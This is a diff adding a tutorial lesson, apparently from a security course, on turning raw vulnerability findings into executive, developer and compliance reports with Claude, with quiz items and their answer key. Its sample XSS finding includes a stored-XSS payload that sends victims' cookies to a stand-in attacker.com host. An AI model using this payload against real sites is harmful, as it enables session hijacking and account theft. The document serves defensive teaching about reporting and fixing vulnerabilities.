@@ -1,0 +1,337 @@
+---
+title: "Security Report Writing"
+slug: "report-writing"
+order: 4
+difficulty: "expert"
+duration: 18
+tags: ["security", "reporting", "documentation", "communication"]
+objectives:
+  - "Transform raw findings into executive-ready security reports"
+  - "Write CVSS scoring explanations and risk ratings"
+  - "Create remediation recommendations developers actually follow"
+  - "Adapt report format for different audiences"
+quiz:
+  - id: "report-1"
+    question: "What is the most important difference between a technical finding and a good security report?"
+    type: "multiple-choice"
+    options:
+      - "The report is longer"
+      - "The report explains business impact, not just technical details — a SQL injection becomes 'attackers can steal all customer data'"
+      - "The report uses more jargon"
+      - "The report includes more screenshots"
+    correct: 1
+    explanation: "A finding says 'SQL injection in /api/search.' A good report says 'An unauthenticated attacker can extract your entire customer database, including names, emails, and payment details, through a SQL injection in the search endpoint. This would trigger a data breach notification requirement under GDPR.' The business impact is what drives action."
+  - id: "report-2"
+    question: "Why should remediation recommendations include specific code examples?"
+    type: "multiple-choice"
+    options:
+      - "To show off your coding skills"
+      - "Because developers are more likely to implement fixes they can copy-paste and understand, reducing mean time to remediation"
+      - "To make the report longer"
+      - "For legal compliance"
+    correct: 1
+    explanation: "Abstract advice like 'sanitize user input' gets ignored. A code example showing the exact parameterized query fix, in the same language and framework the developer uses, gets implemented in hours instead of weeks. Lower the barrier to fixing the vulnerability and it gets fixed faster."
+  - id: "report-3"
+    question: "How should you structure a security report for executive audiences?"
+    type: "multiple-choice"
+    options:
+      - "Include all technical details upfront"
+      - "Lead with business risk and financial impact, use a traffic-light summary, keep technical details in appendices"
+      - "Only include CVSS scores"
+      - "Make it as short as possible with no details"
+    correct: 1
+    explanation: "Executives need to make decisions: how much risk do we have, what does it cost to fix, and what happens if we don't. Lead with a risk summary (red/yellow/green), quantify potential impact (regulatory fines, data breach costs, reputation damage), and put technical details in appendices for those who want to dive deeper."
+  - id: "report-4"
+    question: "What should a security report include for each finding?"
+    type: "multiple-choice"
+    options:
+      - "Just the vulnerability name and CVSS score"
+      - "Title, severity, description, steps to reproduce, impact, remediation with code, and references"
+      - "Only the fix"
+      - "A pass/fail grade"
+    correct: 1
+    explanation: "A complete finding includes: descriptive title, severity with CVSS, clear description of the vulnerability, reproducible steps (so developers can verify it exists and confirm when it's fixed), business impact, remediation with concrete code examples, and references (CWE, OWASP) for context. This gives every stakeholder what they need."
+---
+
+## Why Report Quality Matters
+
+You found a critical SQL injection. Congratulations. Now you need three different people to care: the executive who approves the budget to fix it, the developer who writes the fix, and the compliance officer who tracks remediation. Each needs a different version of the same finding.
+
+A bad report kills great findings. I've seen critical vulnerabilities sit unfixed for months because the report said "SQL injection found, fix it" — the dev team didn't know where, the execs didn't understand the risk, and compliance didn't have anything to track.
+
+## The Finding Template
+
+Here's the template I use with Claude:
+
+```
+Transform this raw finding into a professional security report entry:
+
+Raw finding: [paste your notes]
+
+Use this format:
+
+### [Finding Title]
+
+| Field | Value |
+|-------|-------|
+| ID | VULN-XXX |
+| Severity | Critical/High/Medium/Low |
+| CVSS Score | X.X |
+| CVSS Vector | AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X |
+| CWE | CWE-XXX: Name |
+| OWASP | A0X: Category |
+| Status | Open |
+| Affected | endpoint/component |
+
+**Description:**
+[What the vulnerability is, in clear language]
+
+**Steps to Reproduce:**
+1. [Exact steps anyone can follow]
+
+**Impact:**
+[What an attacker can do — in business terms]
+
+**Remediation:**
+[Specific fix with code example]
+
+**References:**
+[CWE, OWASP, relevant CVEs]
+```
+
+## Example: Raw to Report
+
+Raw notes:
+
+```
+Found XSS in the comments section. When you post a comment with 
+<script>alert(1)</script> it executes. The app uses React but this 
+component uses dangerouslySetInnerHTML. Affects all users who view 
+the page.
+```
+
+After Claude:
+
+```markdown
+### Stored Cross-Site Scripting (XSS) in Comments
+
+| Field | Value |
+|-------|-------|
+| ID | VULN-007 |
+| Severity | High |
+| CVSS Score | 8.1 |
+| CVSS Vector | AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N |
+| CWE | CWE-79: Improper Neutralization of Input During Web Page Generation |
+| OWASP | A03:2021 Injection |
+| Status | Open |
+| Affected | POST /api/comments, GET /page/[id] |
+
+**Description:**
+The comment rendering component uses React's `dangerouslySetInnerHTML`
+to display user-submitted comments without sanitization. An attacker
+can inject arbitrary JavaScript that executes in the browsers of all
+users who view the page containing the malicious comment.
+
+**Steps to Reproduce:**
+1. Authenticate as any user
+2. Navigate to any page with a comment section
+3. Submit a comment with the body:
+   `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
+4. View the page — the script executes in the viewer's browser
+
+**Impact:**
+- **Session hijacking:** Attacker steals session cookies, gaining
+  full access to victim accounts
+- **Data theft:** JavaScript can read page content, form data, and
+  make API requests as the victim
+- **Account takeover:** If an admin views the page, the attacker
+  gains admin-level access
+- **Estimated users affected:** All users who view pages with
+  comments (~12,000 monthly active users)
+
+**Remediation:**
+
+Replace `dangerouslySetInnerHTML` with safe rendering:
+
+```jsx
+// BEFORE (vulnerable)
+<div dangerouslySetInnerHTML={{ __html: comment.body }} />
+
+// AFTER — Option 1: Plain text (safest)
+<p>{comment.body}</p>
+
+// AFTER — Option 2: If HTML formatting is needed, sanitize
+import DOMPurify from 'dompurify';
+<div dangerouslySetInnerHTML={{ 
+  __html: DOMPurify.sanitize(comment.body, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
+    ALLOWED_ATTR: ['href']
+  }) 
+}} />
+```
+
+Additionally, implement Content-Security-Policy headers to mitigate
+impact of any future XSS:
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+**References:**
+- CWE-79: https://cwe.mitre.org/data/definitions/79.html
+- OWASP XSS Prevention Cheat Sheet
+- React Security: dangerouslySetInnerHTML
+```
+
+## Reports for Different Audiences
+
+### Executive Summary
+
+```
+Write an executive summary for these 5 security findings.
+The audience is the CTO and VP of Engineering. They need to 
+understand:
+1. Overall risk level (red/yellow/green)
+2. What's at stake in business terms (not technical terms)
+3. Estimated effort to fix
+4. What happens if we don't fix it
+
+Findings: [paste your findings]
+```
+
+Claude produces something like:
+
+```markdown
+## Security Assessment — Executive Summary
+
+**Overall Risk: RED (Critical)**
+
+### Key Findings
+
+| # | Risk | Business Impact | Fix Effort |
+|---|------|----------------|------------|
+| 1 | Critical | Customer data breach — all 50K user records accessible | 2 days |
+| 2 | High | Account takeover via session hijacking | 1 day |
+| 3 | High | Admin panel accessible without authentication | 4 hours |
+| 4 | Medium | User enumeration enables targeted phishing | 1 day |
+| 5 | Low | Information disclosure via error messages | 2 hours |
+
+### Business Risk
+
+The two critical/high findings (1, 2) could result in:
+- **Regulatory exposure:** GDPR breach notification required within
+  72 hours, potential fine up to 4% of annual revenue
+- **Customer trust:** Public disclosure of a data breach affecting
+  50,000 users
+- **Legal liability:** Customer lawsuits for inadequate data protection
+
+### Recommendation
+
+Findings 1 and 3 should be fixed immediately (combined effort: 
+~2.5 days). Findings 2 and 4 should be addressed this sprint.
+Finding 5 can be scheduled for the next maintenance cycle.
+
+Total estimated remediation effort: 4.5 developer-days.
+```
+
+### Developer Report
+
+```
+Write a developer-focused remediation guide for this finding.
+The developer uses TypeScript, Express.js, and Prisma ORM.
+Include exact code changes, file locations, and test cases 
+to verify the fix.
+
+Finding: [paste finding]
+```
+
+### Compliance Report
+
+```
+Write a compliance-focused summary of these findings for our 
+SOC 2 audit. Map each finding to the relevant SOC 2 Trust 
+Service Criteria (CC6.1, CC6.6, CC7.1, etc.) and indicate
+whether it represents a control deficiency.
+
+Findings: [paste findings]
+```
+
+## CVSS Scoring with Claude
+
+When you're unsure about scoring:
+
+```
+Help me score this vulnerability using CVSS 3.1:
+
+Vulnerability: An authenticated user can modify other users' 
+profile data by changing the user ID in the PUT /api/users/:id 
+request. The endpoint checks authentication but not authorization.
+
+Walk me through each CVSS metric and explain your choice.
+```
+
+Claude walks through each metric with reasoning:
+
+```
+**Attack Vector (AV): Network**
+→ Exploitable over HTTP from anywhere
+
+**Attack Complexity (AC): Low**
+→ No special conditions — just change the ID in the URL
+
+**Privileges Required (PR): Low**
+→ Attacker needs a valid authenticated session (any user account)
+
+**User Interaction (UI): None**
+→ No victim action needed
+
+**Scope (S): Unchanged**
+→ Impact stays within the vulnerable application
+
+**Confidentiality (C): Low**
+→ Attacker can read other users' profile data
+
+**Integrity (I): High**
+→ Attacker can modify other users' data (name, email, etc.)
+
+**Availability (A): None**
+→ No denial of service component
+
+**Final Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N
+**Score:** 7.1 (High)
+```
+
+## Remediation That Gets Implemented
+
+The difference between a fix that ships and one that doesn't:
+
+```
+# Bad remediation
+"Implement proper access controls on the endpoint."
+
+# Good remediation
+"In src/routes/users.ts, line 47, add ownership verification:
+
+```typescript
+// BEFORE
+router.put('/:id', authenticate, async (req, res) => {
+  await prisma.user.update({ where: { id: req.params.id }, data: req.body });
+});
+
+// AFTER
+router.put('/:id', authenticate, async (req, res) => {
+  if (req.params.id !== req.user.id && req.user.role !== 'admin') {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+  await prisma.user.update({ where: { id: req.params.id }, data: req.body });
+});
+```
+
+Test: Send PUT /api/users/OTHER_USER_ID with a regular user's token.
+Expected: 403 Forbidden. Current: 200 OK (vulnerable)."
+```
+
+Specific file, specific line, specific code, specific test. The developer can verify the vulnerability and confirm the fix in under 10 minutes.
+
+## Key Takeaway
+
+A security report is only as good as the action it drives. Use Claude to transform raw findings into structured reports with business impact, CVSS scoring, and framework-specific code fixes. Write three versions: executive summaries that drive budget decisions, developer guides that get fixes shipped, and compliance mappings that satisfy auditors. Always include steps to reproduce (so developers can verify) and specific remediation with code examples (so fixes are implemented, not just discussed). The best finding in the world is worthless if the report doesn't convince someone to fix it.
